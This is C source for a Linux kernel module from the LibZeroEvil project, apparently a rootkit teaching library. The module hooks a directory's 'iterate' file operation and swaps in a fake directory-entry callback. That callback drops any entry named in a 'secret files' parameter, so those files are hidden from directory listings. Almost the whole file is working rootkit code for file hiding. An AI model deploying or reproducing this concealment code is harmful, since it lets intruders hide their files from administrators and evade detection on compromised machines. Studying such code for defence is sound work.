// Copyright 2016 Gu Zhengxiong <rectigu@gmail.com>
//
// This file is part of LibZeroEvil.
//
// LibZeroEvil is free software:
// you can redistribute it and/or modify it
// under the terms of the GNU General Public License
// as published by the Free Software Foundation,
// either version 3 of the License,
// or (at your option) any later version.
//
// LibZeroEvil is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with LibZeroEvil.
// If not, see <http://www.gnu.org/licenses/>.


# ifndef CPP
# include <linux/module.h>
# include <linux/kernel.h>
# include <linux/fs.h> // filp_open, filp_close.
# endif // CPP

//# define DEBUG
# include "zeroevil/zeroevil.h"


MODULE_LICENSE("GPL");

static char root_dir[128] = {"/"};
static char *secret_files[128];
static int secret_files_c;

module_param_string(dir, root_dir, sizeof(root_dir), 0644);
MODULE_PARM_DESC(dir, "parent directory");

module_param_array_named(files, secret_files, charp, &secret_files_c, S_IRUGO);
MODULE_PARM_DESC(files, "secret files");

int
(*real_iterate)(struct file *filp, struct dir_context *ctx);
int
(*real_filldir)(struct dir_context *ctx,
                const char *name, int namlen,
                loff_t offset, u64 ino, unsigned d_type);

int
fake_iterate(struct file *filp, struct dir_context *ctx);
int
fake_filldir(struct dir_context *ctx, const char *name, int namlen,
             loff_t offset, u64 ino, unsigned d_type);


int
init_module(void)
{
    fm_alert("%s\n", "Greetings the World!");

    set_file_op(iterate, root_dir, fake_iterate, real_iterate);

    if (!real_iterate) {
        return -ENOENT;
    }

    return 0;
}


void
cleanup_module(void)
{
    if (real_iterate) {
        void *dummy;
        set_file_op(iterate, root_dir, real_iterate, dummy);
    }

    fm_alert("%s\n", "Farewell the World!");
    return;
}


int
fake_iterate(struct file *filp, struct dir_context *ctx)
{
    real_filldir = ctx->actor;
    *(filldir_t *)&ctx->actor = fake_filldir;

    return real_iterate(filp, ctx);
}


int
fake_filldir(struct dir_context *ctx, const char *name, int namlen,
             loff_t offset, u64 ino, unsigned d_type)
{
    int i;
    for (i=0; i<secret_files_c; i++) {
        if (strcmp(name, secret_files[i]) == 0) {
            fm_alert("Hiding: %s", name);
            return 0;
        }
    }

    /* pr_cont("%s ", name); */

    return real_filldir(ctx, name, namlen, offset, ino, d_type);
}
